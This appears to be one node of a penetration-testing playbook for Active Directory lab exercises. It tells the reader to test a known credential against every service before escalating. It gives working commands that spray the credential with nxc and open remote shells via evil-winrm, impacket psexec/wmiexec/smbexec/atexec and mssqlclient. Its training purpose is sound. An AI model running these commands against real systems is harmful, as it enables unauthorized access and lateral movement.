title: STOP — Use the Credential Before You Escalate
body:
The most expensive mistake in an AD set is holding a valid credential and reaching for a technique instead of a login. Every credential gets the same treatment before anything clever: try it against every service on every host, and try to open an interactive session with it.

This applies hardest to assumed-breach creds. If the brief handed you a username and password, that credential is an intended entry point — not just an enumeration key. Using it to query LDAP and never attempting a shell with it is the single most common way to lose an hour to a technique that was never the path.

This node is the ordering gate. Kerberoasting, silver tickets, ACL abuse, and delegation are what you do AFTER this comes back empty — not instead of it. Sixty seconds here saves the hour. If direct access fails, go to cred_reuse to spray the credential wider and try username variations.
cmd:
# ==== 1. SET THE CREDENTIAL ==========================
export U='user'
export P='password'
export D='domain.local'
export TARGETS='10.10.10.140 10.10.10.141 10.10.10.142'   # or 10.10.10.0/24

# ==== 2. EVERY SERVICE, EVERY HOST ===================
for svc in smb winrm mssql rdp ssh ftp; do
  echo "===== $svc ====="
  nxc $svc $TARGETS -u "$U" -p "$P" -d "$D" 2>/dev/null | grep -F '[+]'
done

# (Pwn3d!) means local admin — that is a shell, right now.

# ==== 3. ATTEMPT AN INTERACTIVE SESSION ==============
# Do NOT skip this because nxc showed no Pwn3d!.
# WinRM is granted by Remote Management Users, not local admin.
evil-winrm -i <HOST> -u "$U" -p "$P"

impacket-psexec    "$D/$U:$P@<HOST>"
impacket-wmiexec   "$D/$U:$P@<HOST>"
impacket-smbexec   "$D/$U:$P@<HOST>"
impacket-atexec    "$D/$U:$P@<HOST>" whoami
impacket-mssqlclient "$D/$U:$P@<HOST>" -windows-auth
xfreerdp3 /u:"$U" /p:"$P" /d:"$D" /v:<HOST> /cert:ignore
ssh "$U@<HOST>"

# ==== 4. WHAT CAN IT READ? ===========================
nxc smb $TARGETS -u "$U" -p "$P" -d "$D" --shares | grep -Fv '[' | grep -E 'READ|WRITE'
nxc smb <HOST> -u "$U" -p "$P" -d "$D" -M spider_plus

# ==== 5. ONLY NOW reach for technique ================
# BloodHound -> ACLs -> Kerberoast -> AS-REP -> delegation -> tickets
warn: No (Pwn3d!) does NOT mean no access. Pwn3d! reports local admin only. WinRM shells come from the Remote Management Users group and MSSQL logins are granted per-login — both are invisible to a Pwn3d! check, and both are common OSCP footholds. Always attempt evil-winrm and mssqlclient by hand even when the spray output looks unremarkable. Check the lockout policy before spraying a password across many accounts, but authenticating one known-good credential against many services is not a spray and carries no lockout risk.

choices.label: No creds yet — check default credentials for the app
Creds valid, no session — spray wider / try variations
Access confirmed nowhere useful — map the graph
Front door exhausted — now escalate technique
